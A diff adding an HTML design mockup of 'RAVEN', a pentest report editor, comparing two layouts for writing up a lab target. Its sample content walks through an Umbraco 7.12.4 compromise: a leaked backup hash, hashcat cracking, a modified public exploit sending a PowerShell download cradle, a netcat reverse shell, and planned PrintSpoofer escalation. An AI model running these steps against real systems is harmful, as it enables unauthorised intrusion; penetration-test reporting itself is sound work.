@@ -1,0 +1,212 @@
+<!doctype html><html><head><meta charset="utf-8"><title>Report: target pages, two ways</title>
+<link href="https://fonts.googleapis.com/css2?family=Instrument+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#000;--fg:#fff;--fg2:#e8e8e8;--muted:#a8a8a8;--m2:#c4c4c4;--faint:#8a8a8a;--line:#1f1f1f;--line2:#2a2a2a;--ls:#3a3a3a;--hi:#111;--acc:#c6ff00;--warn:#e0a030;--paper:#f4f3ef;--ink:#16161a;--ink2:#4a4a52;--rule:#d9d7d0;--chip:#e9e7e1}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#151515;color:var(--fg2);font:14px/20px "Instrument Sans",system-ui,sans-serif;display:grid;gap:40px;padding:32px 0;justify-content:center}
+.mono{font-family:"JetBrains Mono",monospace;font-size:13px}
+.intro{width:1440px;display:grid;gap:6px;padding:0 4px}
+.intro h1{font-size:22px;color:var(--fg);font-weight:600}
+.intro p{color:var(--m2);max-width:900px}
+.intro b{color:var(--acc);font-weight:600}
+.frame{width:1440px;height:900px;overflow:hidden;background:var(--bg);display:grid;grid-template-rows:38px auto auto minmax(0,1fr);border:1px solid var(--line2)}
+.tb{border-bottom:1px solid var(--line);display:grid;grid-template-columns:240px minmax(0,1fr) auto;align-items:center;padding:0 16px}
+.tb b{letter-spacing:.4em;color:var(--fg);font-weight:500}
+.tbc{display:grid;grid-auto-flow:column;gap:16px;color:var(--m2)}
+.strip{display:grid;grid-auto-flow:column;justify-content:start;gap:24px;padding:10px 24px;border-bottom:1px solid var(--line)}
+.strip span{font-size:12px;letter-spacing:.08em;color:var(--muted);font-weight:600}
+.strip i{font-style:normal;color:var(--fg);font-family:"JetBrains Mono",monospace;letter-spacing:0;font-weight:400;font-size:13px;margin-left:6px}
+.strip .w i{color:var(--warn)}
+.tabs{display:grid;grid-template-columns:repeat(7,auto) auto minmax(0,1fr) auto;align-items:end;gap:4px;padding:0 24px;border-bottom:1px solid var(--line)}
+.tabs span{padding:10px 12px;color:var(--muted);display:grid;gap:2px}
+.tabs .on{color:var(--fg);box-shadow:inset 0 -2px var(--acc);background:var(--hi)}
+.tabs small{font-size:12px;color:var(--faint)}.tabs .on small{color:var(--m2)}
+.tabs small.ok{color:var(--acc)}.tabs small.w{color:var(--warn)}
+.tabs .add{color:var(--acc);padding:10px 8px}
+.btn{border:1px solid var(--line2);border-radius:6px;padding:5px 12px;color:var(--fg2);white-space:nowrap;margin-bottom:8px}
+.btn.p{border-color:var(--acc);color:var(--acc)}
+.label{position:relative}
+.tag{position:absolute;right:16px;top:8px;background:var(--acc);color:#000;font-size:12px;font-weight:600;padding:2px 8px;border-radius:4px}
+
+/* paper */
+.page{background:var(--paper);color:var(--ink);padding:36px 52px;display:grid;align-content:start;gap:10px;font-size:14px;line-height:22px;overflow:hidden}
+.page h2{font-size:21px;line-height:28px;font-weight:600}
+.page h3{font-size:15px;font-weight:600;padding-top:8px;border-top:1px solid var(--rule)}
+.page h4{font-size:14px;font-weight:600}
+.page .sub{color:var(--ink2);font-size:13px}
+.ph{color:#77756e}
+.caret{display:inline-block;width:1px;height:16px;background:var(--ink);vertical-align:-3px}
+.facts{display:grid;grid-template-columns:150px minmax(0,1fr);gap:4px 16px;font-size:13.5px;line-height:20px}
+.facts dt{color:var(--ink2);font-weight:600}
+.sev{display:inline-block;background:#b3261e;color:#fff;font-size:12px;font-weight:600;padding:0 8px;border-radius:3px}
+
+/* concept A: steps */
+.steps{display:grid;gap:8px;counter-reset:s}
+.step{display:grid;grid-template-columns:24px minmax(0,1fr);gap:4px 10px}
+.step>.n{font-family:"JetBrains Mono",monospace;font-size:12.5px;color:var(--ink2);padding-top:1px}
+.step>.body{display:grid;gap:6px}
+.chips{display:grid;grid-auto-flow:column;justify-content:start;gap:6px}
+.chip{display:grid;grid-auto-flow:column;align-items:center;gap:8px;background:var(--chip);border:1px solid #dcdad3;border-radius:5px;padding:2px 8px;font-size:12.5px;color:#2b2b31}
+.chip .mono{font-size:12px}
+.chip em{font-style:normal;color:#6b6a64;font-size:12px}
+.chip .th{width:44px;height:26px;border-radius:3px;background:#1b1b1f}
+.chip.app{border-style:dashed}
+.open{background:var(--chip);border-radius:5px;border:1px solid #cfcdc5;display:grid}
+.open .bar{display:grid;grid-template-columns:minmax(0,1fr) auto;align-items:center;padding:4px 10px;border-bottom:1px solid #dcdad3;font-size:12px;color:#6b6a64}
+.open .bar span:last-child{display:grid;grid-auto-flow:column;gap:12px}
+.open pre{font-family:"JetBrains Mono",monospace;font-size:12px;line-height:18px;padding:8px 10px;color:#1d1d22}
+.open pre .c{color:#5a5a62}.open pre .k{background:#f3e8a6}
+.cut{font-size:12px;color:#6b6a64;padding:0 10px 6px}
+.addstep{font-size:13px;color:#6b6a64;border-top:1px dashed #cfcdc5;padding-top:6px}
+
+.workA{display:grid;grid-template-columns:minmax(0,1fr) 780px 300px minmax(0,1fr);gap:0 24px;overflow:hidden;padding-top:20px;background:#050505}
+.workA .page{grid-column:2}
+.rail{display:grid;align-content:start;gap:10px;padding-top:4px;overflow:hidden}
+.rl{font-size:12px;line-height:16px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted);font-weight:600}
+.ri{border-left:2px solid var(--ls);padding:2px 0 2px 10px;display:grid;gap:2px}
+.ri .t{font-family:"JetBrains Mono",monospace;font-size:12px;color:var(--faint)}
+.ri p{font-size:13px;line-height:18px;color:var(--m2)}
+.ri.in{border-color:var(--acc)}.ri.in .t{color:var(--acc)}
+.ri .plus{font-size:12px;color:var(--acc)}
+.grp{font-size:13px;color:var(--fg);font-weight:600;padding-top:6px}
+
+/* concept B: one step */
+.workB{display:grid;grid-template-columns:300px minmax(0,1fr) 300px;overflow:hidden;background:#050505}
+.outline{border-right:1px solid var(--line);padding:20px 16px;display:grid;align-content:start;gap:2px;overflow:hidden}
+.outline .h{font-size:13px;color:var(--fg);font-weight:600;padding:8px 8px 2px}
+.outline .it{display:grid;grid-template-columns:28px minmax(0,1fr) auto;gap:6px;padding:4px 8px;border-radius:6px;font-size:13px;color:var(--m2)}
+.outline .it .mono{font-size:12px;color:var(--faint)}
+.outline .it.cur{background:var(--hi);box-shadow:inset 2px 0 var(--acc);color:var(--fg)}
+.outline .ok{color:var(--acc);font-size:12px}.outline .w{color:var(--warn);font-size:12px}
+.focus{padding:24px 40px;overflow:hidden;display:grid;justify-items:center}
+.focus .page{width:760px}
+.nav{display:grid;grid-auto-flow:column;justify-content:space-between;width:760px;color:var(--muted);font-size:13px;padding-top:12px}
+.nav kbd{font:12px "JetBrains Mono";border:1px solid var(--line2);border-radius:4px;padding:0 5px;color:var(--m2)}
+.shot{height:150px;border-radius:4px;background:#1b1b1f;color:#9a9aa2;display:grid;place-items:center;font-size:13px}
+.cap{font-size:12.5px;color:var(--ink2)}
+.codeb{background:#e9e7e1;border-radius:4px;padding:8px 10px;font-family:"JetBrains Mono",monospace;font-size:12px;line-height:18px;color:#1d1d22;white-space:pre}
+.codeb .c{color:#5a5a62}
+.write{border-left:2px solid var(--ink);padding-left:10px}
+</style></head><body>
+
+<div class="intro">
+<h1>Target pages: two ways to stop the dump</h1>
+<p>Both share three changes. <b>(1)</b> The draft no longer pastes your whole log in. It places only the entries that prove something: the exploit run, the shell, the privesc and the flags. The rest of the target's log waits in the right-hand column, and <b>+</b> drops an entry into the step you're on. <b>(2)</b> Appendices come back: a block's ⋯ menu has "Move to appendix", and <b>+ Page</b> on the tab row adds an appendix or a free page you write yourself. <b>(3)</b> Everything you see stays editable.</p>
+</div>
+
+<!-- ============ A ============ -->
+<div class="frame label">
+<span class="tag">A · Steps (my pick)</span>
+<div class="tb"><b>RAVEN</b><span></span><span class="tbc"><span>Arsenal</span><span>Manual</span><span>Payloads</span><span>Search ⌘K</span></span></div>
+<div class="strip"><span>REPORT<i>OSCP-OS-48213-Exam-Report.pdf</i></span><span>TARGETS READY<i>1/4</i></span><span class="w">TO DO<i>3</i></span></div>
+<div class="tabs"><span>Front matter<small class="ok">ready</small></span><span>1 lnx02<small class="ok">ready</small></span><span class="on">2 ms01<small class="w">3 to do</small></span><span>3 web01<small>not started</small></span><span>4 AD set<small>not started</small></span><span>Appendix A<small>ms01 · 2 items</small></span><span>Appendix B<small>your page</small></span><span class="add">+ Page</span><span></span><span class="btn p">Export PDF</span></div>
+<div class="workA">
+<article class="page">
+<h2>4.2 Target #2 – 10.10.30.5</h2>
+<h3>4.2.2 Initial Access – Umbraco 7.12.4 authenticated RCE</h3>
+<dl class="facts">
+<dt>Explanation</dt><dd>Umbraco CMS 7.12.4 lets an authenticated back-office user run code on the server through the XSLT visualiser.</dd>
+<dt>Fix</dt><dd>Upgrade Umbraco to a supported release; rotate the admin password found in the public backup.</dd>
+<dt>Severity</dt><dd><span class="sev">Critical</span> <span class="mono" style="font-size:12px;color:var(--ink2)">CVSS 9.1</span></dd>
+</dl>
+<h4>Steps to reproduce</h4>
+<div class="steps">
+ <div class="step"><span class="n">1</span><div class="body">
+  <div>Downloaded the public site backup at <span class="mono">/backup/site.zip</span>; its <span class="mono">umbraco.sdf</span> held the admin password hash, which cracked to <span class="mono">baconandcheese</span>.</div>
+  <div class="chips"><span class="chip"><span class="mono">$ strings umbraco.sdf | grep admin</span><em>3 of 212 lines</em></span><span class="chip"><span class="mono">$ hashcat -m 100 …</span><em>1 line</em></span></div>
+ </div></div>
+ <div class="step"><span class="n">2</span><div class="body">
+  <div>Logged in to the back office as <span class="mono">admin@htb.local</span>.</div>
+  <div class="chips"><span class="chip"><span class="th"></span>Figure 1 · Umbraco back office after login</span></div>
+ </div></div>
+ <div class="step"><span class="n">3</span><div class="body">
+  <div>Edited public exploit 46153 to point at our listener and send a PowerShell download cradle<span class="caret"></span></div>
+  <div class="chips"><span class="chip"><span class="mono">46153.py</span><em>modified · 4 lines changed</em></span><span class="chip app"><span class="mono">46153.py</span><em>full file → Appendix A.1</em></span></div>
+ </div></div>
+ <div class="step"><span class="n">4</span><div class="body">
+  <div class="ph">Say what this shows…</div>
+  <div class="open">
+   <div class="bar"><span>Command output · showing 6 of 41 lines</span><span><span>Trim</span><span>Highlight</span><span>Edit text</span><span>⋯</span></span></div>
+   <pre><span class="c">kali$</span> python3 46153.py -u admin@htb.local -p baconandcheese -i http://10.10.30.5
+[+] Logged in
+[+] Payload sent
+<span class="c">kali$</span> nc -lvnp 443
+connect to [172.31.45.12] from (UNKNOWN) [10.10.30.5] 49702
+<span class="k">PS C:\windows\system32\inetsrv&gt; whoami → iis apppool\defaultapppool</span></pre>
+   <div class="cut">35 lines cut. The PDF prints exactly what's shown here.</div>
+  </div>
+ </div></div>
+ <div class="addstep">+ Step   ·   or press <span class="mono">+</span> on anything in the log column</div>
+</div>
+<h3>4.2.3 Privilege Escalation – SeImpersonatePrivilege abuse</h3>
+<div class="facts"><dt>Explanation</dt><dd class="ph">One line on why it works…</dd></div>
+</article>
+<aside class="rail">
+<div class="rl">ms01 log · not in the report</div>
+<div class="grp">Service enumeration</div>
+<div class="ri"><span class="t">13:58 · nmap -sC -sV -p-</span><p>in the Port Scan table already</p></div>
+<div class="ri"><span class="t">14:06 · feroxbuster</span><p>found /backup <span class="plus">+ add</span></p></div>
+<div class="ri"><span class="t">14:11 · note</span><p>umbraco 7.12.4 in footer, check exploitdb <span class="plus">+ add</span></p></div>
+<div class="grp">Initial access</div>
+<div class="ri in"><span class="t">14:40 · python3 46153.py (failed)</span><p>wrong host header. Goes to "Also tested"? <span class="plus">+ add</span></p></div>
+<div class="ri"><span class="t">14:52 · iwr shell.ps1</span><p>no output <span class="plus">+ add</span></p></div>
+<div class="grp">Privilege escalation</div>
+<div class="ri"><span class="t">15:20 · whoami /priv</span><p>SeImpersonate enabled <span class="plus">+ add</span></p></div>
+<div class="ri"><span class="t">15:24 · winPEAS</span><p>2,940 lines <span class="plus">+ to appendix</span></p></div>
+</aside>
+</div>
+</div>
+
+<!-- ============ B ============ -->
+<div class="frame label">
+<span class="tag">B · One step at a time</span>
+<div class="tb"><b>RAVEN</b><span></span><span class="tbc"><span>Arsenal</span><span>Manual</span><span>Payloads</span><span>Search ⌘K</span></span></div>
+<div class="strip"><span>REPORT<i>OSCP-OS-48213-Exam-Report.pdf</i></span><span>TARGETS READY<i>1/4</i></span><span class="w">TO DO<i>3</i></span></div>
+<div class="tabs"><span>Front matter<small class="ok">ready</small></span><span>1 lnx02<small class="ok">ready</small></span><span class="on">2 ms01<small class="w">3 to do</small></span><span>3 web01<small>not started</small></span><span>4 AD set<small>not started</small></span><span>Appendix A<small>ms01 · 2 items</small></span><span>Appendix B<small>your page</small></span><span class="add">+ Page</span><span></span><span class="btn p">Export PDF</span></div>
+<div class="workB">
+<nav class="outline">
+<div class="h">4.2.1 Service Enumeration</div>
+<div class="it"><span class="mono">1</span><span>Port Scan Results</span><span class="ok">✓</span></div>
+<div class="h">4.2.2 Initial Access</div>
+<div class="it"><span class="mono">·</span><span>Explanation, fix, severity</span><span class="ok">✓</span></div>
+<div class="it"><span class="mono">1</span><span>Backup → admin hash</span><span class="ok">✓</span></div>
+<div class="it"><span class="mono">2</span><span>Back-office login</span><span class="ok">✓</span></div>
+<div class="it"><span class="mono">3</span><span>Modified 46153</span><span class="w">write</span></div>
+<div class="it cur"><span class="mono">4</span><span>Reverse shell</span><span class="w">write</span></div>
+<div class="it"><span class="mono">·</span><span>Local.txt</span><span class="ok">✓</span></div>
+<div class="h">4.2.3 Privilege Escalation</div>
+<div class="it"><span class="mono">·</span><span>Explanation, fix, severity</span><span class="w">write</span></div>
+<div class="it"><span class="mono">1</span><span>whoami /priv</span><span></span></div>
+<div class="it"><span class="mono">2</span><span>PrintSpoofer → SYSTEM</span><span></span></div>
+<div class="h">4.2.4 Post-Exploitation</div>
+<div class="it"><span class="mono">·</span><span>Proof.txt</span><span class="ok">✓</span></div>
+<div class="it" style="color:var(--acc)"><span></span><span>+ Step</span><span></span></div>
+</nav>
+<div class="focus">
+<article class="page">
+<div class="sub">4.2.2 Initial Access – Umbraco 7.12.4 authenticated RCE · step 4 of 4</div>
+<div class="write">Ran the modified exploit with the cracked credentials. The listener caught a PowerShell session as the IIS app-pool account<span class="caret"></span></div>
+<div class="codeb"><span class="c">kali$</span> python3 46153.py -u admin@htb.local -p baconandcheese -i http://10.10.30.5
+[+] Logged in
+[+] Payload sent
+<span class="c">kali$</span> nc -lvnp 443
+connect to [172.31.45.12] from (UNKNOWN) [10.10.30.5] 49702
+PS C:\windows\system32\inetsrv&gt; whoami
+iis apppool\defaultapppool</div>
+<div class="cap">6 of 41 lines · Trim · Highlight · Edit text · Move to appendix</div>
+<div class="shot">screenshot: listener receiving the shell</div>
+<div class="cap">Figure 3. Reverse shell as iis apppool\defaultapppool.</div>
+</article>
+<div class="nav"><span><kbd>⌥↑</kbd> previous step</span><span>Preview the whole page <kbd>⌘P</kbd></span><span>next step <kbd>⌥↓</kbd></span></div>
+</div>
+<aside class="rail" style="padding:20px 16px 0">
+<div class="rl">ms01 log · not in the report</div>
+<div class="grp">Initial access</div>
+<div class="ri"><span class="t">14:40 · python3 46153.py (failed)</span><p>wrong host header <span class="plus">+ add here</span></p></div>
+<div class="ri"><span class="t">14:52 · iwr shell.ps1</span><p>no output <span class="plus">+ add here</span></p></div>
+<div class="ri"><span class="t">14:55 · note</span><p>shell dies after ~2 min, re-run <span class="plus">+ add here</span></p></div>
+</aside>
+</div>
+</div>
+
+</body></html>
